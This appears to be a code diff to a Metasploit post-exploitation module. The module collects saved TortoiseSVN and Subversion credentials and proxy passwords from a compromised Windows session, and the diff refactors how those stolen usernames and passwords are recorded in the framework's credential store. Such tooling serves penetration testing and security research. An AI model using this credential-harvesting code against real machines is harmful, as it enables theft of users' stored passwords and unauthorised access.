@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
@@ -89,20 +86,21 @@ class Metasploit3 < Msf::Post
     else
       source_id = nil
     end
-    report_auth_info(
-    :host  => Rex::Socket.resolv(http_proxy_host), # TODO: Fix up report_host?
-    :port => http_proxy_port,
-    :sname => "http",
-    :source_id => source_id,
-    :source_type => "exploit",
-    :user => http_proxy_username,
-    :pass => http_proxy_password)
+
+    report_cred(
+      ip: ::Rex::Socket.resolv(http_proxy_host), # TODO: Fix up report_host?
+      port: http_proxy_port,
+      service_name: 'http',
+      user: http_proxy_username,
+      password: http_proxy_password
+    )
+
   end
 
   def get_config_files
     # Determine if TortoiseSVN is installed and parse config files
     savedpwds = 0
-    path = session.fs.file.expand_path("%APPDATA%\\Subversion\\auth\\svn.simple\\")
+    path = session.sys.config.getenv('APPDATA') + "\\Subversion\\auth\\svn.simple\\"
     print_status("Checking for configuration files in: #{path}")
 
     begin
@@ -121,6 +119,34 @@ class Metasploit3 < Msf::Post
     end
 
   end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: fullname,
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
 
   def analyze_file(filename)
     config = client.fs.file.new(filename, 'r')
@@ -177,15 +203,16 @@ class Metasploit3 < Msf::Post
     else
       source_id = nil
     end
-    report_auth_info(
-    :host  => ::Rex::Socket.resolv_to_dotted(host), # XXX: Workaround for unresolved hostnames
-    :port => portnum,
-    :sname => sname,
-    :source_id => source_id,
-    :source_type => "exploit",
-    :user => user_name,
-    :pass => password)
-    print_debug "Should have reported..."
+
+    report_cred(
+      ip: ::Rex::Socket.resolv_to_dotted(host), # XXX: Workaround for unresolved hostnames
+      port: portnum,
+      service_name: sname,
+      user: user_name,
+      password: password
+    )
+
+    vprint_status("Should have reported...")
 
     # Set savedpwds to 1 on return
     return 1
@@ -202,11 +229,10 @@ class Metasploit3 < Msf::Post
     else
       print_status("Searching for TortoiseSVN...")
       prepare_railgun
-      get_config_files()
-      get_proxy_data()
+      get_config_files
+      get_proxy_data
     end
 
     print_status("Complete")
   end
-
 end
